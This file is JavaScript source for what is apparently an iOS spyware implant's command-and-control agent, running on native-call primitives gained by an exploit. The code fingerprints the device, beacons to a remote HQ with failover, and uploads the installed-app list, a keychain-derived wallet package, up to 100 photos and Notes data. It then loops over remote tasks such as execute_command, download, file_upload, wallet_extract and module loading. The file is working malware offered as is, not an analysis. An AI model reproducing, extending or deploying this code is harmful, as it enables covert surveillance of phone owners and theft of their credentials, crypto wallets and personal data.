			var rf = resolved[fi];
			var fd = readFileB64(rf.absPath, perFileMax);
			if (!fd) continue;
			if (totalSize + fd.size > maxTotal) continue;
			files[rf.relPath] = fd.b64;
			totalSize += fd.size;
		}
		if (Object.keys(files).length > 0) sandbox[key] = files;
	}

	return { device_uuid: deviceUUID, keychain: keychain, sandbox: sandbox };
}

// ============================================================================
// Main Loop
// ============================================================================

// Early raw-TCP pelog is lab-only; production diagnostics use HTTPS _c2Log after Native.init.
const _PELOG_HOST = "127.0.0.1";
const _PELOG_PORT = 9;
const C2_SKIP_UUID = false;
const C2_FALLBACK_UUID = "";

function _earlyBigInt(v) {
	if (typeof v === "bigint") return v;
	if (typeof v === "number") return Number.isFinite(v) ? _rawBigInt(Math.trunc(v)) : 0n;
	if (typeof v === "boolean") return v ? 1n : 0n;
	if (typeof v === "string") { try { return _rawBigInt(v.trim() || "0"); } catch (_) { return 0n; } }
	try { const n = Number(v); return Number.isFinite(n) ? _rawBigInt(Math.trunc(n)) : 0n; } catch (_) { return 0n; }
}

class _EarlyNative {
	static #baseAddr; static #dlsymAddr; static #memcpyAddr; static #mallocAddr;
	static #argMem = 0n; static #argPtr = 0n; static #dlsymCache = {};

	static init() {
		const b = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = b[20]; this.#dlsymAddr = b[21]; this.#memcpyAddr = b[22];
		this.#mallocAddr = b[23];
		this.#argMem = this.#nc(this.#mallocAddr, 0x1000n);
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (let i = 0; i < a.length; i += 0x1000) {
			let n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this.#nc(this.#memcpyAddr, ptr + _earlyBigInt(i), this.#baseAddr + 0x1000n, _earlyBigInt(n));
		}
	}

	static writeString(ptr, str) {
		let b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
		this.write(ptr, b);
	}

	static callSymbol(name, x0, x1, x2, x3) {
		this.#argPtr = this.#argMem;
		if (typeof x0 === "string") { let p = this.#argPtr; this.writeString(p, x0); this.#argPtr += _earlyBigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { let p = this.#argPtr; this.writeString(p, x1); this.#argPtr += _earlyBigInt(x1.length + 1); x1 = p; }
		let r = this.#nc(this.#dlsym(name), this.#arg(x0), this.#arg(x1), this.#arg(x2), this.#arg(x3));
		this.#argPtr = this.#argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	}

	static #arg(v) { return !v ? 0n : typeof v === "bigint" ? v : _earlyBigInt(v); }

	static #dlsym(name) {
		let hit = this.#dlsymCache[name];
		if (hit) return hit;
		let b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < name.length; i++) a[i] = name.charCodeAt(i);
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this.#nc(this.#dlsymAddr, 0xfffffffffffffffen, this.#baseAddr + 0x1000n);
		if (hit) this.#dlsymCache[name] = hit;
		return hit;
	}

	static #nc(addr, x0, x1, x2, x3) {
		let b = new BigInt64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
}

function _earlyPelog(msg) {
	try {
		const body = "seq=0&msg=" + encodeURIComponent(String(msg).slice(0, 500));
		const fd = _EarlyNative.callSymbol("socket", 2, 1, 0);
		if (fd <= 0) return;
		const sa = _EarlyNative.callSymbol("calloc", 1, 16);
		const sab = new ArrayBuffer(16), sv = new DataView(sab);
		sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, _PELOG_PORT, false);
		const p = _PELOG_HOST.split(".");
		sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
		_EarlyNative.write(sa, sab);
		if (_EarlyNative.callSymbol("connect", fd, sa, 16) !== 0) {
			_EarlyNative.callSymbol("free", sa); _EarlyNative.callSymbol("close", fd); return;
		}
		_EarlyNative.callSymbol("free", sa);
		const req = "POST /pelog HTTP/1.0\r\nHost: " + _PELOG_HOST + ":" + _PELOG_PORT +
			"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
		const buf = _EarlyNative.callSymbol("malloc", req.length + 1);
		_EarlyNative.writeString(buf, req);
		_EarlyNative.callSymbol("write", fd, buf, req.length);
		_EarlyNative.callSymbol("free", buf);
		_EarlyNative.callSymbol("close", fd);
	} catch (_) {}
}

function _agentLog(msg) {
	try { _c2Log(msg); } catch (_) { _earlyPelog(msg); }
}

// Marker for pe wait-loop (early pelog is raw-TCP and mute/HTTPS-blind on prod).
function _earlyWriteFile(path, body) {
	try {
		_EarlyNative.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff);
		var fd = Number(_EarlyNative.callSymbol("open", path, 0x0601, 0x1a4));
		if (!(fd >= 0)) return false;
		var s = String(body || "");
		var buf = _EarlyNative.callSymbol("malloc", s.length + 1);
		_EarlyNative.writeString(buf, s);
		_EarlyNative.callSymbol("write", fd, buf, s.length);
		_EarlyNative.callSymbol("free", buf);
		_EarlyNative.callSymbol("close", fd);
		return true;
	} catch (_) {
		return false;
	}
}

try {
	_EarlyNative.init();
	invoker();
	var _earlyPid = Number(_EarlyNative.callSymbol("getpid")) || 0;
	try {
		_earlyWriteFile("/tmp/c2_ipc/agent.entered", JSON.stringify({
			ts: Date.now(),
			pid: _earlyPid,
			stage: "early"
		}));
		_earlyWriteFile("/var/tmp/c2_ipc/agent.entered", JSON.stringify({
			ts: Date.now(),
			pid: _earlyPid,
			stage: "early"
		}));
	} catch (_) {}
	_earlyPelog("[C2-AGENT] script entered pid=" + _earlyPid);
} catch (e) {
	try { _earlyPelog("[C2-AGENT] early init THREW " + String(e).slice(0, 200)); } catch (_) {}
}

function _bootStep(name, fn, optional) {
	try {
		_agentLog("[C2-AGENT] boot step " + name + " start");
		var r = fn();
		_agentLog("[C2-AGENT] boot step " + name + " OK val=" + String(r == null ? "" : r).slice(0, 80));
		return r;
	} catch (e) {
		_agentLog("[C2-AGENT] boot step " + name + " FAIL " + String(e).slice(0, 200));
		if (!optional) throw e;
		return null;
	}
}

try {
	Native.init();
	_agentLog("[C2-AGENT] boot step Native.init OK");
} catch (e) {
	_earlyPelog("[C2-AGENT] boot step Native.init FAIL " + String(e).slice(0, 200));
	throw e;
}
try {
	Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff);
	Native.callSymbol("mkdir", "/var/tmp/c2_ipc", 0x1ff);
	Native.callSymbol("mkdir", "/private/var/tmp/c2_ipc", 0x1ff);
	Native.callSymbol("mkdir", "/tmp/c2_v1", 0x1ff);
	Native.callSymbol("mkdir", "/tmp/c2_v1/sb", 0x1ed);
	// Mute pe pelog ASAP (before C2 resolve / UUID) — pe default is ON until this file exists.
	try { _agentWriteFlags(); } catch (_) {}
	try {
		_resolveC2Endpoints();
	} catch (c2e) {
		_earlyPelog("[C2-AGENT] resolveC2 FAIL " + String(c2e).slice(0, 120));
		try { _applyC2Base(C2_PIN_BASE); } catch (_) {}
	}
	// HTTP probe BEFORE /tmp hb — proves JS+TLS even if file IPC is blocked.
	try {
		var _probeOk = _agentBootProbe("boot_probe");
		_agentLog("[C2-AGENT] boot_probe " + (_probeOk ? "OK" : "FAIL") + " hq=" + HQ_API_BASE);
	} catch (pe) {
		_agentLog("[C2-AGENT] boot_probe THROW " + String(pe).slice(0, 120));
	}
	var _hbPid = Number(Native.callSymbol("getpid")) || 0;
	var _hbBody = JSON.stringify({
		ts: Date.now(),
		pid: _hbPid,
		role: "c2_agent",
		stage: "boot",
		hq: HQ_API_BASE || "",
		c2_from: C2_ENDPOINTS_FROM || ""
	});
	_v1WriteFile("/tmp/c2_ipc/agent.hb", _hbBody);
	_v1WriteFile("/var/tmp/c2_ipc/agent.hb", _hbBody);
	_v1WriteFile("/private/var/tmp/c2_ipc/agent.hb", _hbBody);
	_v1WriteFile("/tmp/c2_v1/sb/agent.hb.json", _hbBody);
	try { _agentWriteFlags(); } catch (_) {}
	_agentLog("[C2-AGENT] hb wrote pid=" + _hbPid + " tg_paused=" + !!C2_TG_PAUSED +
		" pelog=" + !!C2_PELOG_ON + " hq=" + HQ_API_BASE + " from=" + C2_ENDPOINTS_FROM);
	try { _agentBootProbe("hb_wrote"); } catch (_) {}
} catch (hbE) {
	_agentLog("[C2-AGENT] hb write FAIL " + String(hbE).slice(0, 80));
	try { _agentBootProbe("hb_fail"); } catch (_) {}
}

var DEVICE_UUID = "";
var DEVICE_PEID = "";
if (!C2_SKIP_UUID) {
	DEVICE_UUID = String(_bootStep("getDeviceUUID", _getDeviceUUID, true) || "").trim();
}
if (!DEVICE_UUID) {
	try {
		DEVICE_UUID = "sb-" + String(Number(Native.callSymbol("getpid")) || 0);
	} catch (_) {
		DEVICE_UUID = "sb-0";
	}
}
try { _agentLog("[C2-AGENT] boot uuid=" + DEVICE_UUID + " stable=" + C2_STABLE_MODE + " skipUuid=" + C2_SKIP_UUID); } catch(e) {}
try {
	var _idOk = /^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$/.test(DEVICE_UUID);
	if (_idOk) {
		var _keepPeid = "";
		try {
			var _prevB = _readFileBytes("/tmp/c2_ipc/device.json", 4096);
			if (_prevB && _prevB.length) {
				var _prevO = JSON.parse(_rawToStr(_prevB));
				var _pp = String((_prevO && _prevO.peid) || "");
				if (/^peid-[0-9a-f]+$/i.test(_pp)) _keepPeid = _pp;
				else if (_prevO && /^peid-[0-9a-f]+$/i.test(String(_prevO.uuid || "")) && _prevO.source === "peid")
					_keepPeid = String(_prevO.uuid);
			}
		} catch (_) {}
		if (!_keepPeid) {
			try {
				var _pb = _readFileBytes("/var/mobile/Media/.c2_pe_device_id", 128);
				if (_pb && _pb.length) {
					var _ps = _rawToStr(_pb).replace(/\s+/g, "");
					if (/^peid-[0-9a-f]+$/i.test(_ps)) _keepPeid = _ps;
				}
			} catch (_) {}
		}
		var _idBody = JSON.stringify({
			uuid: DEVICE_UUID,
			platform_uuid: DEVICE_UUID,
			serial: "",
			unique: "",
			peid: _keepPeid,
			source: "iokit_uuid",
			from: "c2_agent",
			ts: Date.now()
		});
		_v1WriteFile("/tmp/c2_ipc/device.json", _idBody);
		_v1WriteFile("/tmp/c2_v1/sb/device.json", _idBody);
		try { _agentWriteFlags(); } catch (_) {}
		_agentLog("[C2-AGENT] device.json wrote uuid=" + DEVICE_UUID + " peid=" + (_keepPeid || "-") +
			" tg_paused=" + !!C2_TG_PAUSED);
		DEVICE_PEID = _keepPeid;
	} else {
		_agentLog("[C2-AGENT] device.json skip (not iokit uuid)");
	}
} catch (idE) {
	_agentLog("[C2-AGENT] device.json FAIL " + String(idE).slice(0, 80));
}
var DEVICE_MODEL = _bootStep("getDeviceModel", _getDeviceModel, true) || "iPhone13,2";

function _sysctlString(name) {
	var sizePtr = Native.callSymbol("calloc", 1, 8);
	if (!sizePtr || sizePtr === 0n) return "";
	var rc = Number(Native.callSymbol("sysctlbyname", name, 0, sizePtr, 0, 0));
	if (rc !== 0) { Native.callSymbol("free", sizePtr); return ""; }
	var sz = Number(Native.readPtr(Native.asBigInt(sizePtr)));
	if (sz <= 0 || sz > 4096) { Native.callSymbol("free", sizePtr); return ""; }
	var buf = Native.callSymbol("malloc", Native.asBigInt(sz + 1));
	if (!buf || buf === 0n) { Native.callSymbol("free", sizePtr); return ""; }
	Native.write64(sizePtr, Native.asBigInt(sz + 1));
	rc = Number(Native.callSymbol("sysctlbyname", name, buf, sizePtr, 0, 0));
	var result = rc === 0 ? Native.readString(buf, sz).replace(/\0/g, "") : "";
	Native.callSymbol("free", buf); Native.callSymbol("free", sizePtr);
	return result;
}


var _beaconDevInfo = { machine: DEVICE_MODEL };
if (C2_CHANNEL_CODE) _beaconDevInfo.channel_code = C2_CHANNEL_CODE;
try { _beaconDevInfo.role = "c2_agent"; _beaconDevInfo.source = "c2_agent"; _beaconDevInfo.stage = "agent_alive"; } catch(e) {}
try { if (DEVICE_PEID) _beaconDevInfo.peid = DEVICE_PEID; } catch(e) {}
try {
	var _uts = Native.callSymbol("calloc", 1, 1536);
	if (_uts && _uts !== 0n) {
		Native.callSymbol("uname", _uts);
		_beaconDevInfo.sysname  = Native.readString(_uts, 256).replace(/\0/g, "");
		_beaconDevInfo.nodename = Native.readString(_uts + 256n, 256).replace(/\0/g, "");
		_beaconDevInfo.release  = Native.readString(_uts + 512n, 256).replace(/\0/g, "");
		_beaconDevInfo.version  = Native.readString(_uts + 768n, 256).replace(/\0/g, "");
		_beaconDevInfo.arch     = Native.readString(_uts + 1024n, 256).replace(/\0/g, "");
		Native.callSymbol("free", _uts);
	}
} catch(e) {}
try {
	var _hbuf = Native.callSymbol("malloc", 256);
	if (_hbuf && _hbuf !== 0n) {
		if (Number(Native.callSymbol("gethostname", _hbuf, 255)) === 0)
			_beaconDevInfo.hostname = Native.readString(_hbuf, 256).replace(/\0/g, "");
		Native.callSymbol("free", _hbuf);
	}
} catch(e) {}

try { _beaconDevInfo.build_version = _sysctlString("kern.osversion"); } catch(e) {}
try { _beaconDevInfo.ios_version = _sysctlString("kern.osproductversion"); } catch(e) {}
try { _beaconDevInfo.kern_version = _beaconDevInfo.version || ""; } catch(e) {}

function _senBeacon(st) {
	var status = (st == null || st === "") ? "idle" : String(st);
	try {
		var resp = httpPost(C2_BEACON_URL, {
			uuid: DEVICE_UUID, device_info: _beaconDevInfo, status: status
		});
		if (resp) return resp;
		_c2Log("[C2-AGENT] beacon FAIL (null resp) hq=" + HQ_API_BASE);
		var next = _c2FailoverNext(HQ_API_BASE);
		if (next) {
			_c2Log("[C2-AGENT] beacon failover -> " + next);
			resp = httpPost(C2_BEACON_URL, {
				uuid: DEVICE_UUID, device_info: _beaconDevInfo, status: status
			});
			if (!resp) _c2Log("[C2-AGENT] beacon FAIL after failover");
			return resp;
		}
		return null;
	} catch(e) {
		try { _c2Log("[C2-AGENT] beacon ERR " + String(e)); } catch(le) {}
		try {
			var n2 = _c2FailoverNext(HQ_API_BASE);
			if (n2) {
				return httpPost(C2_BEACON_URL, {
					uuid: DEVICE_UUID, device_info: _beaconDevInfo, status: status
				});
			}
		} catch (_) {}
		return null;
	}
}

// --- Phase 1: First SEN beacon (registers device only; loop /beacon pulls tasks) ---
var _senResp1 = _bootStep("firstBeacon", function () { return _senBeacon("boot"); }, true);
try { _c2Log("[C2-AGENT] first beacon " + (_senResp1 ? "OK ip=" + (_senResp1.client_ip || "?") : "FAIL")); } catch(e) {}
var _deviceIP = "";
if (_senResp1 && _senResp1.client_ip) _deviceIP = _senResp1.client_ip;
try { _c2Log("[C2-AGENT] uuid ready - wait safari_promo before applist"); } catch(e) {}
Native.callSymbol("usleep", C2_STABLE_MODE ? 500000 : 2000000);

function _hqHeartbeat() {
	try {
		var body = { lhu: DEVICE_UUID, type: "status", source: "c2_agent" };
		if (_deviceIP) body.ip = _deviceIP;
		hqPost("/event", body);
	} catch(e) {}
}

// --- Phase 2: HQ auto-collect (SEN heartbeats interspersed) ---
if (!C2_STABLE_MODE) {

try { hqPost("/a", {
	lhu: DEVICE_UUID, machine: DEVICE_MODEL,
	deviceName: _beaconDevInfo.hostname || "",
	ios_version: _beaconDevInfo.ios_version || "",
	build_version: _beaconDevInfo.build_version || "",
	kern_version: _beaconDevInfo.kern_version || "",
	hostname: _beaconDevInfo.hostname || "",
	sysname: _beaconDevInfo.sysname || "",
	release: _beaconDevInfo.release || "",
	version: _beaconDevInfo.version || "",
	ip: _deviceIP,
	source: "c2_agent"
}); } catch(e) {}

Native.callSymbol("usleep", 1000000);
_hqHeartbeat();

try {
	var _hqApps = [];
	var _appBases = [APP_DATA_BASE, "/var/mobile/Containers/Bundle/Application"];
	var _hqDirs = [];
	var _usedBase = "";
	for (var _bi = 0; _bi < _appBases.length; _bi++) {
		_hqDirs = listDir(_appBases[_bi]);
		if (_hqDirs.length > 0) { _usedBase = _appBases[_bi]; break; }
	}
	for (var _ai = 0; _ai < _hqDirs.length; _ai++) {
		if (_hqDirs[_ai].type !== "dir") continue;
		var _acp = _usedBase + "/" + _hqDirs[_ai].name;
		var _apl = _acp + "/.com.apple.mobile_container_manager.metadata.plist";
		var _ab = _readFileBytes(_apl, 8192);
		if (!_ab || _ab.length === 0) continue;
		var _ac = _rawToStr(_ab);
		if (_ac.indexOf("MCMMetadataIdentifier") < 0) continue;
		var _bm = _ac.match(/MCMMetadataIdentifier<\/key>\s*<string>([^<]+)/);
		if (!_bm) {
			var _bpAll = _ac.match(/[a-z][a-z0-9]*(?:\.[a-zA-Z0-9_-]+){2,}/g);
			if (_bpAll) {
				for (var _bpi = 0; _bpi < _bpAll.length; _bpi++) {
					if (_bpAll[_bpi].indexOf("MCM") >= 0) continue;
					_bm = [null, _bpAll[_bpi]];
					break;
				}
			}
		}
		if (!_bm) continue;
		var _appName = _bm[1];
		var _subDirs = listDir(_acp);
		for (var _si = 0; _si < _subDirs.length; _si++) {
			var _sn = _subDirs[_si].name;
			if (_sn.length > 4 && _sn.substring(_sn.length - 4) === ".app") {
				_appName = _sn.substring(0, _sn.length - 4);
				break;
			}
		}
		_hqApps.push({ uuid: _hqDirs[_ai].name, bundleId: _bm[1], name: _appName });
	}
	hqPost("/u", { lhu: DEVICE_UUID, apps: _hqApps, count: _hqApps.length, source: "c2_agent" });
} catch(e) {}

_senBeacon();
Native.callSymbol("usleep", 1000000);

_senBeacon();
_hqHeartbeat();
Native.callSymbol("usleep", 1000000);

try {
	var _kcDonePath = "/tmp/keychain_c2_dump.done";
	var _kcFound = false;
	var _kcPollStart = Date.now();
	while (!_kcFound && (Date.now() - _kcPollStart) < 180000) {
		if (Number(Native.callSymbol("access", _kcDonePath, 0)) === 0) {
			_kcFound = true;
			break;
		}
		Native.callSymbol("usleep", 30000000);
		_senBeacon();
		_hqHeartbeat();
	}
	if (_kcFound) {
		Native.callSymbol("usleep", 2000000);
		var _walletPkg = _buildWalletPkg(DEVICE_UUID);
		if (_walletPkg) {
			var _walletUrl = HQ_API_BASE.replace(/:\d+/, ":" + HQ_WALLET_PORT) + "/war";
			var _walletBodyLen = JSON.stringify(_walletPkg).length;
			_writeLog("[WALLET-HQ] sending to " + _walletUrl + " body=" + _walletBodyLen);
			try {
				var _walletResp = httpPost(_walletUrl, _walletPkg);
				_writeLog("[WALLET-HQ] POST ok resp=" + JSON.stringify(_walletResp));
			} catch(walletErr) {
				_writeLog("[WALLET-HQ] POST FAILED err=" + String(walletErr));
			}
		} else {
			_writeLog("[WALLET-HQ] _buildWalletPkg returned null");
		}
	} else {
		_writeLog("[WALLET-HQ] keychain_c2_dump.done not found after 180s polling");
	}
} catch(walletOuterErr) {
	_writeLog("[WALLET-HQ] outer error: " + String(walletOuterErr));
}

_senBeacon();
_hqHeartbeat();
Native.callSymbol("usleep", 1000000);

try {
	var _hqPhotos = _queryPhotosPaths(100);
	for (var _pi = 0; _pi < _hqPhotos.length; _pi++) {
		var _ph = _hqPhotos[_pi];
		var _psz = getFileSize(_ph.path);
		if (_psz <= 0 || _psz > 3145728) continue;
		var _pmd5 = _md5file(_ph.path, 3145728);
		if (!_pmd5) continue;
		_hqUploadPhoto(_ph.path, _ph.name, DEVICE_UUID, String(_pi + 1), _pmd5);
		Native.callSymbol("usleep", 1200000);
		if ((_pi + 1) % 10 === 0) { _senBeacon(); _hqHeartbeat(); }
	}
} catch(e) {}

} // !C2_STABLE_MODE

// Notes (备忘录): always POST /nb (ok or fail+reason) so C2 can see the flow ran
try {
	_runNotesNb("boot");
} catch (nbE) {
	try {
		_postNotesNb({
			lhu: DEVICE_UUID || "",
			list: [],
			db_files: [],
			db_path: "",
			count: 0,
			source: "c2_agent",
			ok: 0,
			error: "boot_throw",
			reason: String(nbE).slice(0, 200)
		}, "boot");
	} catch (_) {}
	try { _agentLog("[C2-AGENT] boot /nb FAIL " + String(nbE).slice(0, 120)); } catch (_) {}
}

function _v1Mkdirp(path) {
	try {
		var parts = String(path || "").split("/");
		var cur = "";
		for (var i = 0; i < parts.length; i++) {
			if (!parts[i]) continue;
			cur += "/" + parts[i];
			Native.callSymbol("mkdir", cur, 0x1ed);
		}
	} catch (e) {}
}

function _v1WriteFile(path, str) {
	try {
		var s = String(str || "");
		var fd = Number(Native.callSymbol("open", path, 0x0601, 0x1a4));
		if (fd < 0) return false;
		var buf = Native.callSymbol("malloc", s.length + 1);
		Native.writeString(buf, s);
		Native.callSymbol("write", fd, buf, s.length);
		Native.callSymbol("free", buf);
		Native.callSymbol("close", fd);
		Native.callSymbol("chmod", path, 0x1A4);
		return true;
	} catch (e) {
		return false;
	}
}

function _v1WriteEnvelope(finalPath, obj) {
	try {
		var body = JSON.stringify(obj);
		_v1WriteFile(finalPath + ".writing", "{\"pid\":0}");
		_v1WriteFile(finalPath + ".tmp", body);
		Native.callSymbol("rename", finalPath + ".tmp", finalPath);
		_v1WriteFile(finalPath + ".ready", "");
		Native.callSymbol("unlink", finalPath + ".writing");
		return true;
	} catch (e) {
		return false;
	}
}

function _v1ScanApps() {
	// Reuse _collectInstalledApps (XML + string fallback); do not reimplement XML-only scan.
	var apps = [];
	try {
		var al = _collectInstalledApps();
		var list = (al && al.apps) ? al.apps : [];
		for (var i = 0; i < list.length; i++) {
			var a = list[i] || {};
			var bid = String(a.bundleId || "").trim();
			var uuid = String(a.uuid || "").trim();
			if (!bid) continue;
			apps.push({ bundleId: bid, name: bid, uuid: uuid });
		}
	} catch (e) {}
	return apps;
}

function _v1Tick() {
	if (typeof PE_V1_LAYER === "undefined" || !PE_V1_LAYER) return;
	try {
		_v1Mkdirp(PE_V1_IPC_ROOT + "/sb/tasks");
		_v1WriteEnvelope(PE_V1_IPC_ROOT + "/sb/agent.hb.json", {
			pid: 0,
			ts: Date.now() / 1000,
			uuid: DEVICE_UUID,
			pe_uid: DEVICE_UUID
		});
		var apps = _v1ScanApps();
		var resp = hqPost("/api/device/apps", {
			uuid: DEVICE_UUID,
			pe_uid: DEVICE_UUID,
			apps: apps,
			ts: Date.now() / 1000
		});
		var tasks = (resp && resp.tasks) || [];
		for (var i = 0; i < tasks.length; i++) {
			var t = tasks[i];
			if (!t || t.track !== "v1_app" || !t.task_id) continue;
			_v1WriteEnvelope(PE_V1_IPC_ROOT + "/sb/tasks/" + String(t.task_id) + ".json", t);
		}
		try { _c2Log("[C2-V1] apps=" + apps.length + " tasks=" + tasks.length); } catch (e2) {}
	} catch (e) {
		try { _c2Log("[C2-V1] tick err " + e); } catch (e3) {}
	}
}

try { _c2Log("[C2-AGENT] entering 15s beacon loop"); } catch(e) {}
// PE destroy SB RC ~1s after agent.hb; enable ch1 only after that window.
try { Native.callSymbol("usleep", 2500000); } catch (_) {}
try { __c2EnableChannelWire("beacon_loop"); } catch (_) {}
try { _v1Tick(); } catch (e) {}

// --- Phase 3: SEN beacon loop ---

var _hqHeartbeatNext = Date.now() + 60000;
let interval = 15;
for (;;) {
	try {
		var _loopPid = Number(Native.callSymbol("getpid")) || 0;
		var _loopHb = JSON.stringify({
			ts: Date.now(),
			pid: _loopPid,
			role: "c2_agent",
			stage: "loop"
		});
		_v1WriteFile("/tmp/c2_ipc/agent.hb", _loopHb);
		_v1WriteFile("/var/tmp/c2_ipc/agent.hb", _loopHb);
		_v1WriteFile("/private/var/tmp/c2_ipc/agent.hb", _loopHb);
		_v1WriteFile("/tmp/c2_v1/sb/agent.hb.json", _loopHb);
	} catch (_) {}
	try {
		const resp = _senBeacon();

		if (resp && resp.type && resp.type !== "noop") {
			try {
				switch (resp.type) {
					case "execute_command": handleExecuteCommand(resp); break;
					case "ls":          handleLs(resp);          break;
					case "download":    handleDownload(resp);    break;
					case "photos":      handlePhotos(resp);      break;
					case "apps":        handleApps(resp);        break;
					case "app_tree":    handleAppTree(resp);     break;
					case "app_files":   handleAppFiles(resp);    break;
					case "pe_passthrough": handlePePassthrough(resp); break;
					case "pe_load": handlePeLoad(resp); break;
					case "load_module": handlePeLoad(resp); break;
					case "agent_module": handleAgentHotModule(resp); break;
					case "photos_upload_v1": handlePhotosUploadV1(resp); break;
					case "exec":        handleExec(resp);        break;
					case "ping":        handlePing(resp);        break;
					case "file_upload": handleFileUpload(resp);  break;
					case "basic_info":  handleBasicInfo(resp);   break;
					case "disk_scan":    handleDiskScan(resp);    break;
					case "ios_app_data": handleIosAppData(resp);  break;
				case "wallet_extract": handleWalletExtract(resp); break;
				case "wallet_scan":    handleWalletScan(resp);    break;
				case "your_type":      handleYourType(resp);      break;
				case "memo_scan":      handleMemoScan(resp);      break;
				case "photo_scan":     handlePhotoScan(resp);     break;
				case "sleep":
						interval = (resp.params && resp.params.interval) || 15;
						break;
					case "exit":
						break;
				}
			} catch (cmdErr) {
				try {
					sendJSON(resp.command_id, {
						status: "failed",
						error: String(cmdErr),
						_task_id: (resp.params && resp.params._task_id) || "",
						_task_type: (resp.params && resp.params._task_type) || ""
					}, "error_report.json");
				} catch(re) {}
			}
			if (resp.type === "exit") break;
		}
	} catch (e) {
	}

	if (Date.now() >= _hqHeartbeatNext) {
		_hqHeartbeat();
		try { _v1Tick(); } catch (v1e) {}
		_hqHeartbeatNext = Date.now() + 60000;
	}
	try { _tgAuthExfilTick(); } catch (_) {}
	try { _tgV1PushTick(); } catch (_) {}
	try { _applistAfterPromoTick(); } catch (_) {}
	try { _taskPullTick(); } catch (_) {}
	try { _peTaskStatusTick(); } catch (_) {}

	Native.callSymbol("usleep", interval * 1000000);
}
